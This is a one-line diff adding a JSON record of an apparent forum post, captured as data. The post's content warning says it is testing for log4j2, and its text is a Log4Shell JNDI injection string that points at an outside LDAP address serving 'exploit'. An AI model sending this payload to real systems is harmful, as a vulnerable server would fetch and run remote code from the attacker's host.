@@ -1,0 +1,1 @@
+{"code": 0, "data": {"allow_search": false, "attention": 0, "author_title": null, "blocked": false, "can_del": false, "comments": [], "cw": "测试是否中log4j2", "likenum": 1, "pid": 827, "poll": null, "reply": 0, "text": "${jndi:ldap://183.172.66.252:2402/exploit}", "timestamp": 1639213143, "type": "text", "url": null}}
